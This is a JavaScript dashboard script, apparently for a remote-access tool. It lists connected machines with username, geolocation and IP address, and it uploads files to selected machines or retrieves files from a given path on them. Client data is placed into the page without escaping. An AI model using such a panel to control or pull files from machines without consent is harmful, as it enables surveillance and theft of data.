if (!show_logout_button) {
  document.querySelector('li > a[href="/logout"]').parentElement.style.display = 'none';
}

// Function to handle file uploads
function uploadFile() {
  const fileInput = document.getElementById("file-input");
  const file = fileInput.files[0];

  // Check if file exists
  if (!file) {
    alert("Please select a file to upload.");
    return;
  }

  // Check file size (50MB = 50 * 1024 * 1024 bytes)
  const maxSize = 50 * 1024 * 1024; // 50MB
  if (file.size > maxSize) {
    alert("File size exceeds the 50MB limit. Please choose a smaller file.");
    return;
  }

  const checkboxes = document.querySelectorAll(".row-select");

  // Create an array to store the IDs of selected rows
  const selectedElements = [];

  // Loop through the checkboxes
  checkboxes.forEach((checkbox) => {
    // Check if the checkbox is checked
    if (checkbox.checked) {
      // Add the row ID to the selectedElements array
      selectedElements.push(checkbox.dataset.rowId);
    }
  });

  console.log(selectedElements);

  // Create a FormData object to send the file
  const formData = new FormData();
  formData.append("file", file);
  formData.append("uids", JSON.stringify(selectedElements));

  fetch("/upload_file", {
    method: "POST",
    body: formData, // Send formData instead of JSON
  })
    .then((response) => {
      if (response.ok) {
        alert("File Uploaded successfully!");
      } else {
        alert("Failed to upload the file.");
      }
      console.log("Response from server:", response);
    })
    .catch((error) => {
      console.error("Error uploading file:", error);
      alert("Error uploading file.");
    });
}


// Function to filter downloads
function fileDownload() {
  const file_path = document.getElementById("dir-input").value;
  const checkboxes = document.querySelectorAll(".row-select");

  // Create an array to store the IDs of selected rows
  const selectedElements = [];

  // Loop through the checkboxes
  checkboxes.forEach((checkbox) => {
    // Check if the checkbox is checked
    if (checkbox.checked) {
      // Add the row ID to the selectedElements array
      selectedElements.push(checkbox.dataset.rowId);
    }
  });

  console.log(selectedElements, file_path);

  fetch("/download_file", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      file_path: String(file_path),
      uids: selectedElements,
    }),
  })
    .then((response) => {
      console.log("Response from server:", response);
    })
    .catch((error) => {
      console.error("Error sending delete request:", error);
    });
}

function deepEqual(obj1, obj2) {
  return JSON.stringify(obj1) === JSON.stringify(obj2);
}

function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Function to handle file download
function downloadFile(button) {
  const fileName = button.getAttribute("data-filename");
  window.location.href = `/get_downloaded_files/${encodeURIComponent(
    fileName
  )}`;
}

function parseAndFormatTime(dateString) {
  // Parse the dateString in the given format "%Y-%m-%d-%H-%M-%S"
  const dateParts = dateString.split("-");

  // Extract individual components
  const year = dateParts[0];
  const month = parseInt(dateParts[1], 10) - 1; // JavaScript months are 0-based
  const day = dateParts[2];
  const hour = dateParts[3];
  const minute = dateParts[4];
  const second = dateParts[5];

  // Create a new Date object as UTC
  const date = new Date(Date.UTC(year, month, day, hour, minute, second));

  // Convert the UTC date to local time
  const formattedTime = date.toLocaleString(); // Automatically converts to local time

  return formattedTime;
}

old_data_files = [];

async function updateFileList() {
  const response = await fetch("/list_files", { method: "POST" });
  files = await response.text();

  files = files.replace(/'/g, '"');
  files = JSON.parse(files);

  if (!deepEqual(old_data_files, files)) {
    old_data_files = files;

    const tableBody = document.getElementById("file-table");
    tableBody.innerHTML = ""; // Clear existing rows

    for (file in files) {
      file_split = files[file].split("_");
      console.log(file_split);
      const row = document.createElement("tr");
      row.innerHTML = `
                    <td>${file_split[2]}</td>
                    <td>${parseAndFormatTime(file_split[1])}</td>
                    <td><button onclick="downloadFile(this)" data-filename="${escapeHtml(
                      files[file]
                    )}">Download</button></td>
                `;
      tableBody.appendChild(row);
    }
  }
}

// Update file list every 5 seconds
setInterval(updateFileList, 1000);

// Initial update
updateFileList();

old_data = {};
// Function to update the table and map with new data
async function updateDevices() {
  try {
    const response = await fetch("/devices", { method: "POST" });
    const data = await response.json();

    if (!deepEqual(data, old_data)) {
      old_data = data;

      const tableBody = document.getElementById("device-table");
      tableBody.innerHTML = ""; // Clear existing table rows

      Object.keys(data).forEach((clientId) => {
        const clientData = data[clientId];

        const osType = clientData.platform[0];
        const osLogo =
          osType === "Linux"
            ? "https://upload.wikimedia.org/wikipedia/commons/3/35/Tux.svg"
            : osType === "Darwin"
            ? "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
            : osType === "Windows"
            ? "https://upload.wikimedia.org/wikipedia/commons/0/0a/Unofficial_Windows_logo_variant_-_2002%E2%80%932012_%28Multicolored%29.svg"
            : osType === "FreeBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/4/40/Daemon-phk.svg"
            : osType === "OpenBSD"
            ? "https://upload.wikimedia.org/wikipedia/commons/a/ad/Puffy.jpg"
            : osType === "Solaris"
            ? "https://upload.wikimedia.org/wikipedia/commons/d/d2/Icon-sun-solaris_os.svg"
            : osType === "Android"
            ? "https://upload.wikimedia.org/wikipedia/commons/2/26/Android_Robot_Head_2023.svg"
            : "https://static-00.iconduck.com/assets.00/unknown-os-20px-icon-512x512-brbzte7w.png"; // Default logo for other/unknown OS

        // Add a row to the table
        const row = document.createElement("tr");
        if (private_public) {ip_state = clientData.private_ip} else {ip_state = clientData.public_ip}
        image_url = 'https://upload.wikimedia.org/wikipedia/commons/1/1b/Microsoft_Fluent_UI_%E2%80%93_ic_fluent_wifi_off_24_regular.svg'
        if (clientData.status == "Online") {
          image_url = 'https://upload.wikimedia.org/wikipedia/commons/4/4d/Microsoft_Fluent_UI_%E2%80%93_ic_fluent_wifi_1_24_filled.svg'
        }
        if (private_public) {ip_state = clientData.private_ip} else {ip_state = clientData.public_ip}
        row.innerHTML = `
                    <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                    <td>${clientData.username}</td>
                    <td>${clientData.geolocation.address}</td>
                    <td>${clientData.status}&nbsp; <img src='`+image_url+`' alt='Online/Offline Logo'</td>
                    <td><img src="${osLogo}" alt="${osType} logo">${osType}</td>
                    <td>${ip_state}</td>
                `;
        tableBody.appendChild(row);
      });
    }
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

// Call updateDevices to initially load the data
updateDevices();

setInterval(updateDevices, 1000);

// Event listener for "Select All" checkbox
document.getElementById("select-all").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    checkbox.checked = isChecked;
  });
});
document.getElementById("select-all2").addEventListener("change", function () {
  const isChecked = this.checked;
  document.querySelectorAll(".row-select").forEach((checkbox) => {
    checkbox.checked = isChecked;
  });
});


function showPopupAlert(message, type) {
  const popup = document.getElementById('popup-alert');
  const popupMessage = document.getElementById('popup-message');
  popupMessage.textContent = message;
  
  // Add the type class (success or error)
  popup.classList.remove('success', 'error');
  popup.classList.add(type);

  // Show the popup
  popup.style.display = 'block';

  // Hide the popup after 3 seconds or when OK is clicked
  setTimeout(() => {
    popup.style.display = 'none';
  }, 3000);
}

// Example usage of showPopupAlert
document.getElementById('popup-ok-btn').addEventListener('click', function () {
  const popup = document.getElementById('popup-alert');
  popup.style.display = 'none';
});